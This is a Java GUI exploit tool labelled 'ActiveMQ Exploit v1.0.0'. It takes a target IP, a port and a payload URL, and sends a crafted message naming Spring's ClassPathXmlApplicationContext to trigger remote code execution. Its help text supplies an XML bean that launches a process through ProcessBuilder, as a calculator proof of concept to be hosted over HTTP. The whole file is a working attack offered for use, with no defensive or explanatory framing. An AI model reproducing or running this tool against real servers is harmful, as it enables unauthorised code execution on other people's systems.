import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.Socket;

public class ActiveMQ_Gui {
    private JPanel panel1;
    private JTextField IPField;


    private JButton button1;
    private JTextArea textArea1;
    private JTextField PortField;
    private JTextField textField1;
    private JButton helpButton;
    public void AreaAppend(String Text ){
        textArea1.append(Text+"\n");
    }
    public ActiveMQ_Gui() {
        button1.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try{
                    AreaAppend("[+] ActiveMQ Exploit v1.0.0 By:0vercl0k");
                    if (IPField.getText().equals("") && PortField.getText().equals("")) {
                        AreaAppend("请输入目标地址与端口");


                    }
                    String ip = IPField.getText();
                    int port = Integer.parseInt(PortField.getText());
                    Socket sck = new Socket(ip, port);
                    AreaAppend("[+] Connect to TargetIp:"+ip);
                    DataOutputStream out = null;
                    DataInputStream in = null;

                    out = new DataOutputStream(new BufferedOutputStream(new FileOutputStream("pom.xml")));
                    out.writeInt(32);
                    out.writeByte(31);
                    out.writeInt(1);
                    out.writeBoolean(true);
                    out.writeInt(1);
                    out.writeBoolean(true);
                    out.writeBoolean(true);

                    out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
                    out.writeBoolean(true);
                    out.writeUTF(textField1.getText());


                    out.close();
                    AreaAppend("[*] Start exploiting the vulnerability");
                    in = new DataInputStream(new BufferedInputStream(new FileInputStream("pom.xml")));
                    OutputStream os = sck.getOutputStream();
                    int length = in.available();
                    byte[] buf = new byte[length];
                    in.readFully(buf);
                    AreaAppend("[+] Trigger Vulnerability");
                    os.write(buf);
                    in.close();
                    sck.close();
                    try {
                        File delfile = new File("process.dat");
                        delfile.delete();
                    }catch (Exception error){
                        error.printStackTrace();
                    }
                    AreaAppend("[+]Vulnerability exploit completed");

                }catch (Exception error){
                    error.printStackTrace();
                    AreaAppend("未知错误");
                    System.exit(0);
                }
            }
        });

        helpButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                AreaAppend("Please configure the Payload and download it through HTTP. The content is:");
                AreaAppend("\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                        "\n" +
                        "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                        "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                        "    <constructor-arg>\n" +
                        "      <list>\n" +
                        "        <value>open</value>\n" +
                        "        <value>-a</value>\n" +
                        "        <value>calculator</value>\n" +
                        "      </list>\n" +
                        "    </constructor-arg>\n" +
                        "  </bean>\n" +
                        "</beans>\n\n");
            }
        });
    }

    public static void main(String[] args) {
        JFrame frame = new JFrame("ActiveMQ Exploit v1.0.0 By:0vercl0k");
        frame.setContentPane(new ActiveMQ_Gui().panel1);

        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);


        frame.pack();
        frame.setSize(1000, 1000);
        frame.setVisible(true);
    }
}
